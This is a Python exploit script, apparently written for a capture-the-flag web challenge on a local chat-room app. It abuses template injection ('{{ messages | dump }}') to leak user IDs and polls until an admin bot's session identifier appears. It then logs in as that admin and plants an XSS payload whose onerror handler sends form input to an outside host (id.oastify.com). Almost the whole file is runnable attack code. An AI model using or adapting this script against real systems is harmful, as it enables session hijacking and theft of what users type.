import requests
import re
import time
import json
import asyncio
import threading

"""
class requests.Request(
    method: str | None = None, 
    url: _t.UriType | None = None, 
    headers: _t.HeadersType = None, 
    files: _t.FilesType = None, 
    data: _t.DataType = None, 
    params: _t.ParamsType = None, 
    auth: _t.AuthType = None, 
    cookies: RequestsCookieJar | CookieJar | dict[str, str] | None = None, 
    hooks: _t.HooksInputType | None = None, 
    json: _t.JsonType = None
)
"""

def print_prepare_req(req: requests.PreparedRequest):
    print("======= print prepare request =======")
    print("===== request headers =====")
    print(f"{req.method} {req.url}")
    headers = "\n".join([f"{name}: {value}" for name, value in req.headers.items()])
    print(headers)
    print("===== request body =====")
    print("=== row body ===")
    print(req.body)
    print("=== pretty body ===")
    print(req.body.decode('latin-1'))
    print()


def print_res(res: requests.Response):
    print("======= print response =======")
    print("===== response headers =====")
    print(f"{res.status_code} {res.reason}")
    headers = "\n".join([f"{name}: {value}" for name, value in res.headers.items()])
    print(headers)
    print("===== response body =====")
    print("=== row body ===")
    print(res.content)
    print("=== pretty body ===")
    print(res.text)
    print()

HOST = "127.0.0.1:8000"
ROOM_ID = "1b34b95f7d4daaa93ead8c844bbce955"
COOKIE = {"user" : {"userId" : "1d89425b-15c7-4594-ae33-b22e83f302eee"}}

# 访问 room
def check_room():

    req = requests.Request(
        method = 'GET', 
        url = f'http://{HOST}/api/room/{ROOM_ID}',
        cookies = COOKIE["user"]
        )
    r = req.prepare()

    s = requests.Session()
    res = s.send(r)
    print_res(res)
    return res

check_room()

# 调试，发送消息以使用正则表达式提取
def send_message():
    message_payload = {"message": "e93f4f88"}

    req = requests.Request(
        method = 'POST', 
        url = f'http://{HOST}/api/room/{ROOM_ID}',
        cookies = COOKIE["user"],
        json= message_payload
        )
    r = req.prepare()

    s = requests.Session()
    res = s.send(r)

send_message()

# 修改模板
def change_template(cookie, template_payload):

    req = requests.Request(
        method = 'POST', 
        url = f'http://{HOST}/api/room/{ROOM_ID}/set-template',
        cookies = cookie,
        json= template_payload
        )
    r = req.prepare()
    print_prepare_req(r)

    s = requests.Session()
    res = s.send(r)
    print_res(res)

    # 调试，得到自己的 cookie
    # grep_user_cookie(res)

# 从修改后的模板提取 cookie
def grep_user_cookie(res: requests.Response):
    res_body_match = re.findall(r"&quot;author&quot;:&quot;(.+?)&quot;,", res.text)
    print(res_body_match)
    admin_cookie = res_body_match[-1]
    print(admin_cookie)
    return admin_cookie

template_payload = {"template": "{{ messages | dump }}"}
change_template(cookie=COOKIE["user"], template_payload=template_payload)

# 发送 room 编号到联系端点，注意此处将阻塞，需设置异步或者简单的手动发送请求
def send_visit():

    req = requests.Request(
        method = 'POST', 
        url = f'http://{HOST}/api/visit',
        cookies = COOKIE["user"],
        json = {"roomId": ROOM_ID}
        )
    r = req.prepare()

    s = requests.Session()
    res = s.send(r)
    print_res(res)
    return res

# 持续访问 room 直到获取管理员 cookie，调试时无限循环
def get_admin_cookie():
    while True:
        res = check_room()
        get_cookie = grep_user_cookie(res)
        if COOKIE["user"]["userId"] != get_cookie:
            break
        time.sleep(0.5)

    return get_cookie


def take_cookie_and_set_xss():
    admin_id = get_admin_cookie()
    COOKIE["admin"] = {"userId" : admin_id}

    # 使用管理员凭据发送模板 XSS 载荷

    template_payload = {"template":"<img/src/onerror='\r\n    document.querySelector(\"#form-input\").addEventListener(\"change\", (event) => {\r\n        fetch(\"//id.oastify.com/data?\"+event.target.value);\r\n    });\r\n    '>"}

    change_template(cookie=COOKIE["admin"], template_payload=template_payload)

# 协程型
# async def main():
#     await asyncio.gather(
#         asyncio.to_thread(send_visit),
#         asyncio.to_thread(take_cookie_and_set_xss)
#         )

# asyncio.run(main())

# 线程型
def main():
    thread_send_visit = threading.Thread(target=send_visit)
    thread_send_visit.start()

    take_cookie_and_set_xss()

    thread_send_visit.join()

main()